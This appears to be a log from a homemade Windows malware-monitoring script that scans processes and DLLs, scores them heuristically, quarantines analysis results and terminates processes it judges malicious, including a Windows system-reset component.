+[Thu Jun 12 21:54:25 2025][CRITICAL] Internet access detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['#3', '#22', 'getaddrinfo', '#115', '#116', '#23', '#4', '#16', 'freeaddrinfo', '#19']
+[Thu Jun 12 21:54:25 2025][CRITICAL] Process manipulation detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'Process32NextW', 'Process32FirstW']
+[Thu Jun 12 21:54:25 2025][ERROR] Unexpected error analyzing process 6476: process PID not found (pid=6476)
+[Thu Jun 12 21:54:26 2025][APR] Analyzing process with PID: 1660 - Name: handle.exe
+[Thu Jun 12 21:54:26 2025][CRITICAL] Process handle.exe-1660 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:26 2025][WARN] Process handle.exe-1660 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:26 2025][INFO] Process handle.exe-1660 is running as SYSTEM
+[Thu Jun 12 21:54:26 2025][INFO] Process handle.exe-1660 deemed safe (Score: 40)
+[Thu Jun 12 21:54:26 2025][APR] Function analyze_process completed in 0.440 seconds
+[Thu Jun 12 21:54:27 2025][APR] Analyzing process with PID: 4284 - Name: systemresetplatform.exe
+[Thu Jun 12 21:54:27 2025][CRITICAL] Process systemresetplatform.exe-4284 is in watchlist
+[Thu Jun 12 21:54:27 2025][WARN] Process systemresetplatform.exe-4284 is running cmd: C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe
+[Thu Jun 12 21:54:27 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\systemresetplatform.exe_analysis_20250612_215427.json
+[Thu Jun 12 21:54:27 2025][CRITICAL] Process systemresetplatform.exe-4284 is malicious (Score: 50)
+[Thu Jun 12 21:54:27 2025][ALERT] Attempting to terminate process PID 4284 - systemresetplatform.exe
+[Thu Jun 12 21:54:28 2025][ALERT] Terminated process PID 4284
+[Thu Jun 12 21:54:28 2025][APR] Function analyze_process completed in 0.844 seconds
+[Thu Jun 12 21:54:28 2025][ERROR] Unexpected error analyzing process 1564: process PID not found (pid=1564)
+[Thu Jun 12 21:54:28 2025][ERROR] Unexpected error analyzing process 9164: process PID not found (pid=9164)
+[Thu Jun 12 21:54:29 2025][CRITICAL] EXE rjvplatform.dll is in watchlist
+[Thu Jun 12 21:54:29 2025][AEXE] Function analyze_exe completed in 4.852 seconds
+[Thu Jun 12 21:54:29 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\RjvPlatform.dll_analysis_20250612_215429.json
+[Thu Jun 12 21:54:29 2025][CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[Thu Jun 12 21:54:29 2025][INFO] New Executable file detected: {file_path}
+[Thu Jun 12 21:54:29 2025][AEXE] Analyzing EXEcutable file: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:30 2025][APR] Analyzing process with PID: 2360 - Name: manalyze.exe
+[Thu Jun 12 21:54:30 2025][CRITICAL] Malicious string found in C:\$SysReset\Framework\Stack\RjvPlatform.dll with plugin imports
+[Thu Jun 12 21:54:30 2025][ERROR] Unexpected error analyzing process 2360: process no longer exists (pid=2360, name='manalyze.exe')
+[Thu Jun 12 21:54:30 2025][CRITICAL] Code injection detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'VirtualAllocEx', 'CreateRemoteThread']
+[Thu Jun 12 21:54:30 2025][CRITICAL] Internet access detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['#3', '#22', 'getaddrinfo', '#115', '#116', '#23', '#4', '#16', 'freeaddrinfo', '#19']
+[Thu Jun 12 21:54:30 2025][CRITICAL] Process manipulation detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'Process32NextW', 'Process32FirstW']
+[Thu Jun 12 21:54:31 2025][APR] Analyzing process with PID: 6852 - Name: handle.exe
+[Thu Jun 12 21:54:31 2025][CRITICAL] Process handle.exe-6852 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:31 2025][WARN] Process handle.exe-6852 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:31 2025][INFO] Process handle.exe-6852 is running as SYSTEM
+[Thu Jun 12 21:54:32 2025][INFO] Process handle.exe-6852 deemed safe (Score: 40)
+[Thu Jun 12 21:54:32 2025][APR] Function analyze_process completed in 0.884 seconds
+[Thu Jun 12 21:54:33 2025][APR] Analyzing process with PID: 6832 - Name: sppsvc.exe
+[Thu Jun 12 21:54:33 2025][WARN] Process sppsvc.exe-6832 is running cmd: C:\Windows\system32\sppsvc.exe
+[Thu Jun 12 21:54:33 2025][INFO] Process sppsvc.exe-6832 deemed safe (Score: 0)
+[Thu Jun 12 21:54:33 2025][APR] Function analyze_process completed in 0.267 seconds
+[Thu Jun 12 21:54:34 2025][CRITICAL] EXE rjvplatform.dll is in watchlist
+[Thu Jun 12 21:54:34 2025][AEXE] Function analyze_exe completed in 4.871 seconds
+[Thu Jun 12 21:54:34 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\RjvPlatform.dll_analysis_20250612_215434.json
+[Thu Jun 12 21:54:34 2025][CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[Thu Jun 12 21:54:34 2025][APR] Analyzing process with PID: 10116 - Name: filecoauth.exe
+[Thu Jun 12 21:54:34 2025][WARN] Process filecoauth.exe-10116 is running cmd: C:\Program Files\Microsoft OneDrive\25.091.0512.0001\FileCoAuth.exe -Embedding
+[Thu Jun 12 21:54:35 2025][INFO] Process filecoauth.exe-10116 deemed safe (Score: 0)
+[Thu Jun 12 21:54:35 2025][APR] Function analyze_process completed in 0.442 seconds
+[Thu Jun 12 21:55:33 2025][APR] Analyzing process with PID: 5992 - Name: splwow64.exe
+[Thu Jun 12 21:55:33 2025][WARN] Process splwow64.exe-5992 is running cmd: C:\Windows\splwow64.exe 8192
+[Thu Jun 12 21:55:33 2025][INFO] Process splwow64.exe-5992 deemed safe (Score: 0)
+[Thu Jun 12 21:55:33 2025][APR] Function analyze_process completed in 0.240 seconds
+[Thu Jun 12 21:56:03 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.1:63136 > 192.168.146.126:ssh PA / Raw
+[Thu Jun 12 21:56:03 2025][NET] Packet encoded: True
+[Thu Jun 12 21:56:03 2025][NET] Network: TCP 192.168.146.1:63136 -> 192.168.146.126:22
+[Thu Jun 12 21:56:15 2025][APR] Analyzing process with PID: 3600 - Name: git-remote-https.exe
+[Thu Jun 12 21:56:15 2025][WARN] Process git-remote-https.exe-3600 is running cmd: git-remote-https origin https://github.com/Te-k/pecli.git
+[Thu Jun 12 21:56:16 2025][INFO] Process git-remote-https.exe-3600 deemed safe (Score: 0)
+[Thu Jun 12 21:56:16 2025][APR] Function analyze_process completed in 0.261 seconds
+[Thu Jun 12 21:56:16 2025][APR] Analyzing process with PID: 8680 - Name: git-remote-https.exe
+[Thu Jun 12 21:56:16 2025][WARN] Process git-remote-https.exe-8680 is running cmd: git-remote-https origin https://github.com/Witnull/EvilMacroDetector.git
+[Thu Jun 12 21:56:16 2025][INFO] Process git-remote-https.exe-8680 deemed safe (Score: 0)
+[Thu Jun 12 21:56:16 2025][APR] Function analyze_process completed in 0.205 seconds
+[Thu Jun 12 21:56:47 2025][APR] Analyzing process with PID: 7688 - Name: microsoftedgeupdate.exe
+[Thu Jun 12 21:56:47 2025][CRITICAL] Process microsoftedgeupdate.exe-7688 has suspicious command: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua /installsource scheduler
+[Thu Jun 12 21:56:47 2025][WARN] Process microsoftedgeupdate.exe-7688 is running cmd: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua /installsource scheduler
+[Thu Jun 12 21:56:47 2025][INFO] Process microsoftedgeupdate.exe-7688 is running as SYSTEM
+[Thu Jun 12 21:56:48 2025][INFO] Process microsoftedgeupdate.exe-7688 deemed safe (Score: 40)
+[Thu Jun 12 21:56:48 2025][APR] Function analyze_process completed in 0.203 seconds
+[Thu Jun 12 21:56:48 2025][APR] Analyzing process with PID: 8532 - Name: svchost.exe
+[Thu Jun 12 21:56:48 2025][WARN] Process svchost.exe-8532 is running cmd: C:\Windows\system32\svchost.exe -k wsappx -p
+[Thu Jun 12 21:56:48 2025][INFO] Process svchost.exe-8532 is running as SYSTEM
+[Thu Jun 12 21:56:48 2025][INFO] Process svchost.exe-8532 deemed safe (Score: 20)
+[Thu Jun 12 21:56:48 2025][APR] Function analyze_process completed in 0.187 seconds
+[Thu Jun 12 21:57:22 2025][APR] Analyzing process with PID: 6700 - Name: python.exe
+[Thu Jun 12 21:57:22 2025][CRITICAL] Process python.exe-6700 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py stop
+[Thu Jun 12 21:57:22 2025][WARN] Process python.exe-6700 is running cmd: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py stop
+[Thu Jun 12 21:57:22 2025][INFO] Process python.exe-6700 deemed safe (Score: 20)
+[Thu Jun 12 21:57:22 2025][APR] Function analyze_process completed in 0.289 seconds
+[Thu Jun 12 21:57:23 2025][INFO] Service stopped
+[Thu Jun 12 21:57:36 2025][APR] Analyzing process with PID: 7524 - Name: python.exe
+[Thu Jun 12 21:57:36 2025][CRITICAL] Process python.exe-7524 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py remove
+[Thu Jun 12 21:57:36 2025][WARN] Process python.exe-7524 is running cmd: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py remove
+[Thu Jun 12 21:57:36 2025][INFO] Process python.exe-7524 deemed safe (Score: 20)
+[Thu Jun 12 21:57:36 2025][APR] Function analyze_process completed in 0.287 seconds
